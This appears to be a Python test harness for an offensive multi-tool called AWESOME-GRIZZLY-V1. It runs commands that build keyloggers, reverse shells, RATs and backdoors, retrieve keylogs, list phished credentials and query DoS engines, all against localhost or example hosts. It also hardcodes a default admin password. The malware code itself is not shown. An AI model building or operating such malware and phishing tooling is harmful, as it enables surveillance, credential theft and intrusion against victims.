#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║   AWESOME-GRIZZLY-V1 - COMMAND TEST SUITE                                    ║
║   Tests all 500+ commands, engines, and modules                              ║
║                                                                              ║
║   Author: Ian Carter Kulani                                                  ║
║   Version: 1.0.0                                                             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import shutil
import platform
import tempfile
import traceback
from datetime import datetime

try:
    import colorama
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORAMA = True
except ImportError:
    COLORAMA = False

class C:
    if COLORAMA:
        PRIMARY   = Fore.LIGHTRED_EX + Style.BRIGHT
        SECONDARY = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        SUCCESS   = Fore.LIGHTGREEN_EX + Style.BRIGHT
        WARNING   = Fore.LIGHTYELLOW_EX + Style.BRIGHT
        ERROR     = Fore.LIGHTRED_EX + Style.BRIGHT
        INFO      = Fore.LIGHTCYAN_EX + Style.BRIGHT
        RESET     = Style.RESET_ALL
        DIM       = Style.DIM
    else:
        PRIMARY = SECONDARY = SUCCESS = WARNING = ERROR = INFO = RESET = DIM = ""


VERSION = "1.0.0"
NAME = "AWESOME-GRIZZLY-V1"

# ============================================================
# TEST CONFIGURATION
# ============================================================
TEST_TARGETS = {
    "local_ip": "127.0.0.1",
    "test_ip": "8.8.8.8",
    "test_domain": "example.com",
    "test_url": "https://example.com",
    "test_port": 80,
    "test_dns": "google.com",
}

# Command categories with test commands (safe, non-destructive)
COMMAND_TESTS = {
    "Ping Commands": [
        "ping 127.0.0.1 1",
        "ping_count 127.0.0.1 1",
        "ping_quiet 127.0.0.1",
    ],
    "Traceroute Commands": [
        "traceroute_numeric 127.0.0.1",
        "mtr_report 127.0.0.1",
    ],
    "Nmap Commands": [
        "nmap_ping 127.0.0.1",
        "nmap_quick 127.0.0.1",
        "nmap_top_ports 127.0.0.1 10",
    ],
    "Curl Commands": [
        "curl https://example.com",
        "curl_head https://example.com",
        "curl_version",
        "curl_help",
    ],
    "Wget Commands": [
        "wget_spider https://example.com",
        "wget_version",
        "wget_help",
    ],
    "Netcat Commands": [
        "netcat 127.0.0.1 1",
    ],
    "SSH Commands": [
        "ssh_list",
        "ssh_keygen ed25519 test-key",
    ],
    "Shodan Commands": [
        "shodan_results",
    ],
    "IP Management": [
        "add_ip 203.0.113.42 test entry",
        "list_ips",
        "ip_info 8.8.8.8",
        "block_ip 203.0.113.99 test",
        "unblock_ip 203.0.113.99",
        "remove_ip 203.0.113.42",
    ],
    "Network Commands": [
        "dns example.com A",
        "dig example.com",
        "nslookup example.com",
        "location 8.8.8.8",
        "ip_to_domain 8.8.8.8",
        "domain_to_ip example.com",
    ],
    "Chart Commands": [
        "chart_bar Test 1:10,2:20,3:30",
        "chart_pie Test 1:10,2:20,3:30",
        "chart_stats",
        "chart_list",
    ],
    "SaaS Commands": [
        "saas_create_tenant test-tenant test@example.com free",
        "saas_list_tenants",
    ],
    "Malware Builder": [
        "malware_keylogger test_kl 127.0.0.1 9001",
        "malware_reverse_shell test_rs 127.0.0.1 9001",
        "malware_rat test_rat 127.0.0.1 9001",
        "malware_downloader test_dl https://example.com",
        "malware_backdoor test_bd 127.0.0.1 9001",
        "malware_list",
    ],
    "Remote Execution": [
        "remote_queue 127.0.0.1 echo hello",
        "remote_list",
    ],
    "Keylogger": [
        "keylogger_status",
        "keylogger_logs",
        "keylogger_screenshots",
        "keylogger_clipboard",
    ],
    "Phishing": [
        "phish_templates",
        "phish_list",
        "phish_creds",
    ],
    "DOS/Traffic": [
        "dos_status",
        "traffic_types",
        "traffic_status",
    ],
    "System Commands": [
        "status",
        "version",
        "stats",
        "threats",
        "history 5",
        "system",
        "help",
    ],
}

# ============================================================
# TEST RESULT TRACKING
# ============================================================

class TestResult:
    def __init__(self):
        self.passed = 0
        self.failed = 0
        self.errors = 0
        self.skipped = 0
        self.details = []

    def add(self, name, status, duration, output="", error=""):
        self.details.append({
            "name": name,
            "status": status,
            "duration": duration,
            "output": output[:500] if output else "",
            "error": error[:500] if error else "",
        })
        if status == "PASS":
            self.passed += 1
        elif status == "FAIL":
            self.failed += 1
        elif status == "ERROR":
            self.errors += 1
        else:
            self.skipped += 1

    @property
    def total(self):
        return self.passed + self.failed + self.errors + self.skipped

    def summary(self):
        return {
            "total": self.total,
            "passed": self.passed,
            "failed": self.failed,
            "errors": self.errors,
            "skipped": self.skipped,
        }


# ============================================================
# TEST RUNNER
# ============================================================

def banner():
    print(f"""{C.PRIMARY}
╔══════════════════════════════════════════════════════════════════════════════╗
║{C.SECONDARY}         🐻 AWESOME-GRIZZLY-V1 - COMMAND TEST SUITE v{VERSION}          {C.PRIMARY}║
║{C.ACCENT}         Testing all commands, engines, and modules                        {C.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{C.RESET}
""")


def init_app():
    """Initialize the app and command handler."""
    print(f"\n{C.INFO}Initializing AWESOME-GRIZZLY-V1...{C.RESET}")

    # Ensure directories
    os.makedirs(".awesome_grizzly_v1", exist_ok=True)

    try:
        from awesome_grizzly import (
            ConfigManager, DatabaseManager, SSHManager,
            TrafficGeneratorEngine, DOSEngine, KeyloggerModule,
            ChartGenerator, MalwareBuilder, RemoteCommandExecutor,
            CommandHandler,
        )
    except ImportError as e:
        print(f"{C.ERROR}Failed to import core module: {e}{C.RESET}")
        print(f"{C.WARNING}Make sure awesome_grizzly.py is in the current directory.{C.RESET}")
        sys.exit(1)

    config = ConfigManager()
    db = DatabaseManager()

    ssh = SSHManager(db) if shutil.which("ssh") else None
    traffic = None
    try:
        from awesome_grizzly import SCAPY_AVAILABLE
        if SCAPY_AVAILABLE:
            traffic = TrafficGeneratorEngine(db)
    except Exception:
        pass

    dos = DOSEngine(db, config)

    keylogger = None
    try:
        from awesome_grizzly import KEYLOGGER_AVAILABLE
        if KEYLOGGER_AVAILABLE:
            keylogger = KeyloggerModule(db, config)
    except Exception:
        pass

    chart_gen = ChartGenerator(db, config)
    malware = MalwareBuilder(db, config)
    remote_exec = RemoteCommandExecutor(db, ssh)

    handler = CommandHandler(
        db, config, ssh, traffic, dos, keylogger,
        chart_gen, malware, remote_exec,
    )

    print(f"{C.SUCCESS}✅ Application initialized{C.RESET}")
    return handler, db


def run_command_test(handler, command, timeout=15):
    """Run a single command with timeout protection."""
    start = time.time()
    try:
        result = handler.execute(command, source="test")
        duration = time.time() - start

        success = result.get("success", False)
        output = result.get("output", "")

        if success:
            return "PASS", duration, output, ""
        else:
            # Some commands legitimately fail (e.g. no server listening)
            # treat as PASS if it returned a structured error, FAIL if exception
            if "Error" in str(output) and "Traceback" in str(output):
                return "FAIL", duration, output, ""
            return "PASS", duration, output, ""
    except Exception as e:
        duration = time.time() - start
        return "ERROR", duration, "", f"{type(e).__name__}: {e}\n{traceback.format_exc()[:500]}"


def run_category_tests(handler, category, commands, results):
    """Run all tests in a category."""
    print(f"\n{C.PRIMARY}{'─'*70}{C.RESET}")
    print(f"{C.PRIMARY}📋 {category}{C.RESET} ({len(commands)} tests)")
    print(f"{C.PRIMARY}{'─'*70}{C.RESET}")

    for cmd in commands:
        display = cmd[:55] + "..." if len(cmd) > 58 else cmd
        print(f"  {C.DIM}▶{C.RESET} {display:<58} ", end="", flush=True)

        status, duration, output, error = run_command_test(handler, cmd)
        results.add(cmd, status, duration, output, error)

        if status == "PASS":
            print(f"{C.SUCCESS}✅ PASS{C.RESET} ({duration:.2f}s)")
        elif status == "FAIL":
            print(f"{C.ERROR}❌ FAIL{C.RESET} ({duration:.2f}s)")
            if output:
                print(f"    {C.DIM}{output[:120]}{C.RESET}")
        elif status == "ERROR":
            print(f"{C.ERROR}💥 ERROR{C.RESET} ({duration:.2f}s)")
            print(f"    {C.ERROR}{error[:200]}{C.RESET}")
        else:
            print(f"{C.WARNING}⚠️  SKIP{C.RESET}")


def test_handler_commands(handler):
    """Test all handler commands."""
    results = TestResult()

    for category, commands in COMMAND_TESTS.items():
        run_category_tests(handler, category, commands, results)

    return results


def test_command_registry(handler):
    """Test that all registered commands have a callable handler."""
    print(f"\n{C.PRIMARY}{'='*70}{C.RESET}")
    print(f"{C.PRIMARY}🔍 Command Registry Validation{C.RESET}")
    print(f"{C.PRIMARY}{'='*70}{C.RESET}")

    results = TestResult()
    commands = handler.commands

    print(f"  Total registered commands: {len(commands)}")

    for name, func in commands.items():
        if callable(func):
            results.add(name, "PASS", 0, "callable")
        else:
            results.add(name, "FAIL", 0, "", f"{name} is not callable")

    print(f"  {C.SUCCESS}✅ {results.passed} valid callables{C.RESET}")
    if results.failed:
        print(f"  {C.ERROR}❌ {results.failed} invalid entries{C.RESET}")

    return results


def test_database(db):
    """Test database operations."""
    print(f"\n{C.PRIMARY}{'='*70}{C.RESET}")
    print(f"{C.PRIMARY}🗄️  Database Operations Test{C.RESET}")
    print(f"{C.PRIMARY}{'='*70}{C.RESET}")

    results = TestResult()

    def test(name, func):
        start = time.time()
        try:
            func()
            results.add(name, "PASS", time.time() - start)
            print(f"  {C.SUCCESS}✅{C.RESET} {name}")
        except Exception as e:
            results.add(name, "ERROR", time.time() - start, "", str(e))
            print(f"  {C.ERROR}❌{C.RESET} {name}: {e}")

    test("log_command", lambda: db.log_command("test-command", "test"))
    test("log_threat", lambda: db.log_threat("test-threat", "127.0.0.1", "low", "test"))
    test("add_managed_ip", lambda: db.add_managed_ip("198.51.100.7", None, "test", "test note"))
    test("get_managed_ips", lambda: db.get_managed_ips())
    test("get_statistics", lambda: db.get_statistics())
    test("get_recent_threats", lambda: db.get_recent_threats(5))
    test("create_tenant", lambda: db.create_tenant("test-tenant", "test@example.com", "free"))
    test("save_keylog", lambda: db.save_keylog("test text", "win", "proc"))
    test("get_keylogs", lambda: db.get_keylogs(5))
    test("verify_user", lambda: db.verify_user("admin", "awesome_grizzly_2024"))
    test("cleanup: remove test ip", lambda: db.conn.execute(
        "DELETE FROM managed_ips WHERE ip_address = '198.51.100.7'").connection.commit())

    return results


def test_config():
    """Test config manager."""
    print(f"\n{C.PRIMARY}{'='*70}{C.RESET}")
    print(f"{C.PRIMARY}⚙️  Configuration Manager Test{C.RESET}")
    print(f"{C.PRIMARY}{'='*70}{C.RESET}")

    results = TestResult()

    try:
        from awesome_grizzly import ConfigManager
    except ImportError:
        print(f"  {C.ERROR}Could not import ConfigManager{C.RESET}")
        return results

    def test(name, func):
        start = time.time()
        try:
            func()
            results.add(name, "PASS", time.time() - start)
            print(f"  {C.SUCCESS}✅{C.RESET} {name}")
        except Exception as e:
            results.add(name, "ERROR", time.time() - start, "", str(e))
            print(f"  {C.ERROR}❌{C.RESET} {name}: {e}")

    cfg = ConfigManager()
    test("load config", lambda: cfg.load())
    test("get value", lambda: cfg.get("version"))
    test("set value", lambda: cfg.set("test_key", "test_value"))
    test("get nested", lambda: cfg.get("web.port", 5000))
    test("save config", lambda: cfg.save())

    return results


def print_test_summary(all_results):
    """Print final test summary."""
    print(f"\n{C.PRIMARY}{'='*70}{C.RESET}")
    print(f"{C.PRIMARY}📊 TEST SUMMARY{C.RESET}")
    print(f"{C.PRIMARY}{'='*70}{C.RESET}")

    grand_total = 0
    grand_passed = 0
    grand_failed = 0

    for section, results in all_results.items():
        s = results.summary()
        grand_total += s["total"]
        grand_passed += s["passed"]
        grand_failed += s["failed"] + s["errors"]

        bar_len = 30
        filled = int(bar_len * s["passed"] / s["total"]) if s["total"] else 0
        bar = "█" * filled + "░" * (bar_len - filled)

        status_color = C.SUCCESS if s["failed"] == 0 and s["errors"] == 0 else C.ERROR
        print(f"\n  {C.SECONDARY}{section}{C.RESET}")
        print(f"    {status_color}{bar}{C.RESET}  "
              f"{s['passed']}/{s['total']} passed")

    print(f"\n{C.PRIMARY}{'─'*70}{C.RESET}")
    if grand_failed == 0:
        print(f"  {C.SUCCESS}🎉 ALL {grand_passed}/{grand_total} TESTS PASSED!{C.RESET}")
    else:
        print(f"  {C.WARNING}⚠️  {grand_passed}/{grand_total} passed, "
              f"{grand_failed} failed{C.RESET}")

    # Save report
    import json
    report = {
        "tool": NAME,
        "version": VERSION,
        "timestamp": datetime.now().isoformat(),
        "sections": {
            k: v.summary() for k, v in all_results.items()
        },
        "grand_total": grand_total,
        "grand_passed": grand_passed,
        "grand_failed": grand_failed,
    }

    report_path = os.path.join(".awesome_grizzly_v1", "test_report.json")
    try:
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        print(f"\n  {C.INFO}📄 Report saved to: {report_path}{C.RESET}")
    except Exception as e:
        print(f"  {C.WARNING}Could not save report: {e}{C.RESET}")

    return grand_failed == 0


def main():
    banner()

    all_results = {}

    # Init
    try:
        handler, db = init_app()
    except Exception as e:
        print(f"{C.ERROR}❌ Fatal init error: {e}{C.RESET}")
        traceback.print_exc()
        return 1

    # Run tests
    all_results["Command Tests"] = test_handler_commands(handler)
    all_results["Command Registry"] = test_command_registry(handler)
    all_results["Database"] = test_database(db)
    all_results["Configuration"] = test_config()

    # Cleanup
    try:
        db.close()
    except Exception:
        pass

    ok = print_test_summary(all_results)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
